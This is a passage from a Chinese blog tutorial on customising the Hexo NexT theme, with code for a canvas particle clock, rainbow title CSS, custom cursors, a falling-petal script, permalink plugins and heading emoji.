class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;&quot;&gt;</span><br><span class="line">  &lt;canvas id=&quot;canvas&quot; style=&quot;width:60%;&quot;&gt;当前浏览器不支持canvas，请更换浏览器后再试&lt;/canvas&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">(function()&#123;</span><br><span class="line"></span><br><span class="line">   var digit=</span><br><span class="line">    [</span><br><span class="line">        [</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,1,1,0,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,0,1,1,0],</span><br><span class="line">            [0,0,1,1,1,0,0]</span><br><span class="line">        ],//0</span><br><span class="line">        [</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,1,1,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [1,1,1,1,1,1,1]</span><br><span class="line">        ],//1</span><br><span class="line">        [</span><br><span class="line">            [0,1,1,1,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,1,1,0,0,0],</span><br><span class="line">            [0,1,1,0,0,0,0],</span><br><span class="line">            [1,1,0,0,0,0,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,1,1,1,1,1]</span><br><span class="line">        ],//2</span><br><span class="line">        [</span><br><span class="line">            [1,1,1,1,1,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,1,1,0]</span><br><span class="line">        ],//3</span><br><span class="line">        [</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,1,0],</span><br><span class="line">            [0,0,1,1,1,1,0],</span><br><span class="line">            [0,1,1,0,1,1,0],</span><br><span class="line">            [1,1,0,0,1,1,0],</span><br><span class="line">            [1,1,1,1,1,1,1],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,1,1]</span><br><span class="line">        ],//4</span><br><span class="line">        [</span><br><span class="line">            [1,1,1,1,1,1,1],</span><br><span class="line">            [1,1,0,0,0,0,0],</span><br><span class="line">            [1,1,0,0,0,0,0],</span><br><span class="line">            [1,1,1,1,1,1,0],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,1,1,0]</span><br><span class="line">        ],//5</span><br><span class="line">        [</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,1,1,0,0,0],</span><br><span class="line">            [0,1,1,0,0,0,0],</span><br><span class="line">            [1,1,0,0,0,0,0],</span><br><span class="line">            [1,1,0,1,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,1,1,0]</span><br><span class="line">        ],//6</span><br><span class="line">        [</span><br><span class="line">            [1,1,1,1,1,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,1,1,0,0,0],</span><br><span class="line">            [0,0,1,1,0,0,0],</span><br><span class="line">            [0,0,1,1,0,0,0],</span><br><span class="line">            [0,0,1,1,0,0,0]</span><br><span class="line">        ],//7</span><br><span class="line">        [</span><br><span class="line">            [0,1,1,1,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,1,1,0]</span><br><span class="line">        ],//8</span><br><span class="line">        [</span><br><span class="line">            [0,1,1,1,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,1,1,0,0,0,0]</span><br><span class="line">        ],//9</span><br><span class="line">        [</span><br><span class="line">            [0,0,0,0,0,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,0,0,0,0,0],</span><br><span class="line">            [0,0,0,0,0,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,0,0,0,0,0]</span><br><span class="line">        ]//:</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">var canvas = document.getElementById(&apos;canvas&apos;);</span><br><span class="line"></span><br><span class="line">if(canvas.getContext)&#123;</span><br><span class="line">    var cxt = canvas.getContext(&apos;2d&apos;);</span><br><span class="line">    //声明canvas的宽高</span><br><span class="line">    var H = 100,W = 700;</span><br><span class="line">    canvas.height = H;</span><br><span class="line">    canvas.width = W;</span><br><span class="line">    cxt.fillStyle = &apos;#f00&apos;;</span><br><span class="line">    cxt.fillRect(10,10,50,50);</span><br><span class="line"></span><br><span class="line">    //存储时间数据</span><br><span class="line">    var data = [];</span><br><span class="line">    //存储运动的小球</span><br><span class="line">    var balls = [];</span><br><span class="line">    //设置粒子半径</span><br><span class="line">    var R = canvas.height/20-1;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());</span><br><span class="line">        //存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这7个数字组成</span><br><span class="line">        data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);</span><br><span class="line">    &#125;)();</span><br><span class="line"></span><br><span class="line">    /*生成点阵数字*/</span><br><span class="line">    function renderDigit(index,num)&#123;</span><br><span class="line">        for(var i = 0; i &lt; digit[num].length; i++)&#123;</span><br><span class="line">            for(var j = 0; j &lt; digit[num][i].length; j++)&#123;</span><br><span class="line">                if(digit[num][i][j] == 1)&#123;</span><br><span class="line">                    cxt.beginPath();</span><br><span class="line">                    cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI);</span><br><span class="line">                    cxt.closePath();</span><br><span class="line">                    cxt.fill();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*更新时钟*/</span><br><span class="line">    function updateDigitTime()&#123;</span><br><span class="line">        var changeNumArray = [];</span><br><span class="line">        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());</span><br><span class="line">        var NewData = [];</span><br><span class="line">        NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);</span><br><span class="line">        for(var i = data.length-1; i &gt;=0 ; i--)&#123;</span><br><span class="line">            //时间发生变化</span><br><span class="line">            if(NewData[i] !== data[i])&#123;</span><br><span class="line">                //将变化的数字值和在data数组中的索引存储在changeNumArray数组中</span><br><span class="line">                changeNumArray.push(i+&apos;_&apos;+(Number(data[i])+1)%10);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //增加小球</span><br><span class="line">        for(var i = 0; i&lt; changeNumArray.length; i++)&#123;</span><br><span class="line">            addBalls.apply(this,changeNumArray[i].split(&apos;_&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        data = NewData.concat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*更新小球状态*/</span><br><span class="line">    function updateBalls()&#123;</span><br><span class="line">        for(var i = 0; i &lt; balls.length; i++)&#123;</span><br><span class="line">            balls[i].stepY += balls[i].disY;</span><br><span class="line">            balls[i].x += balls[i].stepX;</span><br><span class="line">            balls[i].y += balls[i].stepY;</span><br><span class="line">            if(balls[i].x &gt; W + R || balls[i].y &gt; H + R)&#123;</span><br><span class="line">                balls.splice(i,1);</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*增加要运动的小球*/</span><br><span class="line">    function addBalls(index,num)&#123;</span><br><span class="line">        var numArray = [1,2,3];</span><br><span class="line">        var colorArray =  [&quot;#3BE&quot;,&quot;#09C&quot;,&quot;#A6C&quot;,&quot;#93C&quot;,&quot;#9C0&quot;,&quot;#690&quot;,&quot;#FB3&quot;,&quot;#F80&quot;,&quot;#F44&quot;,&quot;#C00&quot;];</span><br><span class="line">        for(var i = 0; i &lt; digit[num].length; i++)&#123;</span><br><span class="line">            for(var j = 0; j &lt; digit[num][i].length; j++)&#123;</span><br><span class="line">                if(digit[num][i][j] == 1)&#123;</span><br><span class="line">                    var ball = &#123;</span><br><span class="line">                        x:14*(R+2)*index + j*2*(R+1)+(R+1),</span><br><span class="line">                        y:i*2*(R+1)+(R+1),</span><br><span class="line">                        stepX:Math.floor(Math.random() * 4 -2),</span><br><span class="line">                        stepY:-2*numArray[Math.floor(Math.random()*numArray.length)],</span><br><span class="line">                        color:colorArray[Math.floor(Math.random()*colorArray.length)],</span><br><span class="line">                        disY:1</span><br><span class="line">                    &#125;;</span><br><span class="line">                    balls.push(ball);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*渲染*/</span><br><span class="line">    function render()&#123;</span><br><span class="line">        //重置画布宽度，达到清空画布的效果</span><br><span class="line">        canvas.height = 100;</span><br><span class="line">        //渲染时钟</span><br><span class="line">        for(var i = 0; i &lt; data.length; i++)&#123;</span><br><span class="line">            renderDigit(i,data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        //渲染小球</span><br><span class="line">        for(var i = 0; i &lt; balls.length; i++)&#123;</span><br><span class="line">            cxt.beginPath();</span><br><span class="line">            cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI);</span><br><span class="line">            cxt.fillStyle = balls[i].color;</span><br><span class="line">            cxt.closePath();</span><br><span class="line">            cxt.fill();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clearInterval(oTimer);</span><br><span class="line">    var oTimer = setInterval(function()&#123;</span><br><span class="line">        //更新时钟</span><br><span class="line">        updateDigitTime();</span><br><span class="line">        //更新小球状态</span><br><span class="line">        updateBalls();</span><br><span class="line">        //渲染</span><br><span class="line">        render();</span><br><span class="line">    &#125;,50);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p> 在<code>/themes/next/layout/_macro/sidebar.swig</code>中引入： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include &apos;../_custom/clock.swig&apos; %&#125;</span><br></pre></td></tr></table></figure><h2 id="网站-logo-炫彩效果"><a href="#网站-logo-炫彩效果" class="headerlink" title="网站 logo 炫彩效果"></a>网站 logo 炫彩效果</h2><p>在 /themes/next/source/css/_custom/custom.styl 中添加以下 css ，如果之前已经设置了，根据情况进行替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.site-title&#123;</span><br><span class="line">  background-image: linear-gradient(</span><br><span class="line">    to right,</span><br><span class="line">    orangered,</span><br><span class="line">    orange,</span><br><span class="line">    gold,</span><br><span class="line">    lightgreen,</span><br><span class="line">    cyan,</span><br><span class="line">    dodgerblue,</span><br><span class="line">    mediumpurple,</span><br><span class="line">    hotpink,</span><br><span class="line">    orangered</span><br><span class="line">  );</span><br><span class="line">  background-size: 110vw;</span><br><span class="line">  -webkit-background-clip: text;</span><br><span class="line">  color: rgba(0,0,0,0.1); /* transparent IE 不支持 */</span><br><span class="line">  animation: sliding 30s linear infinite;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes sliding&#123;</span><br><span class="line">  to&#123;</span><br><span class="line">    background-position:  -2000vw;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.site-meta,</span><br><span class="line">.site-subtitle &#123;</span><br><span class="line">  color: rgba(0,0,0,0.1); /* transparent IE 不支持 */</span><br><span class="line">  animation: hue 1.5s linear infinite;</span><br><span class="line">  background-image: linear-gradient(to right bottom, rgb(255,0,0), rgb(255,128,0), rgb(255,255,0), rgb(0,255,0), rgb(0,255,128), rgb(0,255,255), rgb(0,128,255), rgb(0,0,255), rgb(128,0,255), rgb(255,0,255), rgb(255,0,128));</span><br><span class="line">  -webkit-background-clip: text;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes hue &#123;</span><br><span class="line">  from &#123;</span><br><span class="line">      filter: hue-rotate(0);</span><br><span class="line">  &#125;</span><br><span class="line">  to &#123;</span><br><span class="line">      filter: hue-rotate(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.site-meta&#123;</span><br><span class="line">  background: #ecf9f8;</span><br><span class="line">  +mobile()&#123;</span><br><span class="line">    padding: 10px 0;</span><br><span class="line">    background-image: linear-gradient(90deg,#f79533 0,#f37055 15%,#ef4e7b 30%,#a166ab 44%,#5073b8 58%,#1098ad 72%,#07b39b 86%,#6dba82 100%)!important;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="鼠标样式"><a href="#鼠标样式" class="headerlink" title="鼠标样式"></a>鼠标样式</h2><p>添加CSS样式代码：</p><p>文件位置：<code>/themes/next/source/css/_custom/custom.styl</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* 鼠标样式 */</span><br><span class="line">* &#123;</span><br><span class="line">  cursor: url(/images/default.cur),auto;</span><br><span class="line">&#125;</span><br><span class="line">:link &#123;</span><br><span class="line">  cursor: url(/images/pointer.cur),auto</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 用到的两个文件：<code>default.cur</code>、<code>pointer.cur</code> 位于 images 目录下，因为是 .cur 这种静态光标文件，编辑器打开是一堆 <a href="http://ascii.911cha.com/" rel="external nofollow" target="_blank">ASCII 码</a>，这里就不贴了，直接附上链接，当然，你也可以在浏览器里获取。 </p><p><a href="https://n407pengyuyan.github.io/images/default.cur" rel="external nofollow" target="_blank">default.cur</a></p><p><a href="https://n407pengyuyan.github.io/images/pointer.cur" rel="external nofollow" target="_blank">pointer.cur</a></p><h2 id="飘落特效"><a href="#飘落特效" class="headerlink" title="飘落特效"></a>飘落特效</h2><p>将<a href="https://n407pengyuyan/js/src/sakura.js" rel="external nofollow" target="_blank">文件</a>保存在<code>\themes\next\source\js\src\</code>下命名为<code>sakura.js</code>;<br>然后在<code>\themes\next\layout\_layout.swig</code> 文件里引用即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 花飘落特效 --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">  var windowWidth = $(window).width();</span><br><span class="line">  if (windowWidth &gt; 480) &#123;</span><br><span class="line">    document.write(&apos;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/sakura.js&quot;&gt;&lt;\/script&gt;&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="中文链接转拼音"><a href="#中文链接转拼音" class="headerlink" title="中文链接转拼音"></a>中文链接转拼音</h2><h3 id="hexo-permalink-pinyin-插件"><a href="#hexo-permalink-pinyin-插件" class="headerlink" title="hexo-permalink-pinyin 插件"></a>hexo-permalink-pinyin 插件</h3><p><a href="https://github.com/viko16/hexo-permalink-pinyin" rel="external nofollow" target="_blank">项目地址</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-permalink-pinyin --save</span><br></pre></td></tr></table></figure><h3 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h3><p>在站点配置文件中新增以下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">permalink_pinyin:</span><br><span class="line">  enable: true</span><br><span class="line">  separator: &apos;-&apos;   # default: &apos;-&apos;</span><br></pre></td></tr></table></figure></p><blockquote><p>enable：是否启用插件<br>separator：指定分隔符，默认为’-‘’</p></blockquote><h2 id="Hexo-abbrlink生成唯一文章链接"><a href="#Hexo-abbrlink生成唯一文章链接" class="headerlink" title="Hexo-abbrlink生成唯一文章链接"></a><code>Hexo-abbrlink</code>生成唯一文章链接</h2><p>中文转拼音 这样方案也存在一定的缺陷，比如修改了文章标题，重新<code>hexo</code>三连后，URL就变了，以前的文章地址变成了<code>404</code>。而且这样生成的URL层级也很深，不利于<code>SEO</code>。 </p><p><code>Hexo-abbrlink</code><a href="https://github.com/Rozbo/hexo-abbrlink" rel="external nofollow" target="_blank">项目地址</a></p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><blockquote><p> 执行此命令可能会不成功，提示你缺少相应的依赖，比如babel-eslint、mini-css-extract-plugin、webpack-cli…<br> 使用npm命令安装即可，比如<code>npm install eslint@4.x babel-eslint@8 --save-dev</code> </p></blockquote><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p> 修改根目录站点配置文件<code>config.yml</code>，改为： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">abbrlink:</span><br><span class="line">    alg: crc32   #算法： crc16(default) and crc32</span><br><span class="line">    rep: hex     #进制： dec(default) and hex</span><br><span class="line">permalink: :abbrlink.html  # 此处可以自己设置，也可以直接使用 :/abbrlink</span><br></pre></td></tr></table></figure><p>注意一定要注释原有的<code>permalink</code></p><h3 id="官方样例"><a href="#官方样例" class="headerlink" title="官方样例"></a>官方样例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">crc16 &amp; hex</span><br><span class="line">https://post.zz173.com/posts/66c8.html</span><br><span class="line"></span><br><span class="line">crc16 &amp; dec</span><br><span class="line">https://post.zz173.com/posts/65535.html</span><br><span class="line">crc32 &amp; hex</span><br><span class="line">https://post.zz173.com/posts/8ddf18fb.html</span><br><span class="line"></span><br><span class="line">crc32 &amp; dec</span><br><span class="line">https://post.zz173.com/posts/1690090958.html</span><br></pre></td></tr></table></figure><p>生成完后，原<code>md</code>文件的<code>Front-matter</code>内会增加<code>abbrlink</code> 字段，值为生成的ID 。这个字段确保了在我们修改了<code>Front-matter</code> 内的博客标题title或创建日期date字段之后而不会改变链接地址。</p><h2 id="h1-h6前添加表情"><a href="#h1-h6前添加表情" class="headerlink" title="h1-h6前添加表情"></a><code>h1-h6</code>前添加表情</h2><p>在<code>\themes\next\source\css\_custom\custom.styl</code>中添加一下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">/* 一到六级标题设置 */</span><br><span class="line">.posts-expand .post-body h1,</span><br><span class="line">.posts-expand .post-body h2,</span><br><span class="line">.posts-expand .post-body h3,</span><br><span class="line">.posts-expand .post-body h4,</span><br><span class="line">.posts-expand .post-body h5,</span><br><span class="line">.posts-expand .post-body h6 &#123;</span><br><span class="line">  padding-top: 10px;</span><br><span class="line">  margin-bottom: 10px;</span><br><span class="line">  border-bottom: 1px solid #eee;</span><br><span class="line">  padding-bottom: 10px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*修改h1前面图标*/</span><br><span class="line">.posts-expand .post-body h1:before &#123;</span><br><span class="line">  top: 10px;</span><br><span class="line">  width: 18px;</span><br><span class="line">  height: 18px;</span><br><span class="line">  content: &quot;⛅&quot;;</span><br><span class="line">  font-size: 18px;</span><br><span class="line">  line-height: 18px;</span><br><span class="line">  margin-right: 16px;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*修改h2前面图标*/</span><br><span class="line">.posts-expand .post-body h2:before &#123;</span><br><span class="line">  top: 10px;</span><br><span class="line">  width: 18px;</span><br><span class="line">  height: 18px;</span><br><span class="line">  content: &quot;🌞&quot;;</span><br><span class="line">  font-size: 18px;</span><br><span class="line">  line-height: 18px;</span><br><span class="line">  margin-right: 16px</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*修改h3前面图标*/</span><br><span class="line">.posts-expand .post-body h3:before &#123;</span><br><span class="line">  top: 10px;</span><br><span class="line">  width: 18px;</span><br><span class="line">  height: 18px;</span><br><span class="line">  content: &quot;📖&quot;;</span><br><span class="line">  font-size: 18px;</span><br><span class="line">  line-height: 18px;</span><br><span class="line">  margin-right: 16px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*修改h4前面图标*/</span><br><span class="line">.posts-expand .post-body h4:before &#123;</span><br><span class="line">  top: 10px;</span><br><span class="line">  width: 18px;</span><br><span class="line">  height: 18px;</span><br><span class="line">  content: &quot;🔖&quot;;</span><br><span class="line">  font-size: 18px;</span><br><span class="line">  line-height: 18px;</span><br><span class="line">  margin-right: 16px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*修改h5前面图标*/</span><br><span class="line">.posts-expand .post-body h5:before &#123;</span><br><span class="line">  top: 10px;</span><br><span class="line">  width: 18px;</span><br><span class="line">  height: 18px;</span><br><span class="line">  content: &quot;☑&quot;;</span><br><span class="line">  font-size: 18px;</span><br><span class="line">  line-height: 18px;</span><br><span class="line">  margin-right: 16px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 